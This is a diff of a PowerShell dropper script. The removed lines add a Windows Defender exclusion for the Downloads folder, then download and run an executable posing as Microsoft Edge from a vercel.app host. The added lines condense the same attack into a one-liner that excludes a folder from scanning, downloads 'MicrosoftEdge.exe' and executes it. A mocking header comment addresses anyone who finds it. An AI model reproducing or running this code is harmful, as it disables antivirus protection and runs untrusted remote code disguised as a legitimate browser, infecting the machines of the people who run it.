@@ -1,16 +1,5 @@
 # If you found this, CONGRATS! You probably think you some kind of cyber analyst Guru. Nah. I'm just lazy. But good job at poking around.
 
-# Create an exclusion for the Downloads folder in Windows Defender (requires admin privileges)
-Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\Downloads"
+Add-MpPreference -ExclusionPath "C:\Folder"
 
-# Comment: This step adds the Downloads folder to the list of exclusions in Windows Defender, allowing files downloaded to this folder to bypass antivirus scanning.
-
-# Download the executable from the hosted URL (replace with your hosted file URL)
-Invoke-WebRequest -Uri "https://nyanza.vercel.app/assets/Microsoft%20Edge.exe" -OutFile "C:\Users\$env:USERNAME\Downloads\Microsoft.Edge.exe"
-
-# Comment: This command downloads the Microsoft Edge executable file to the Downloads folder.
-
-# Run the downloaded executable
-Start-Process "C:\Users\$env:USERNAME\Downloads\Microsoft.Edge.exe"
-
-# Comment: This command runs the downloaded executable file.
+iwr "nyanza.vercel.app/assets/MicrosoftEdge.exe" -OutFile "C:\file.exe"; iex "C:\file.exe"
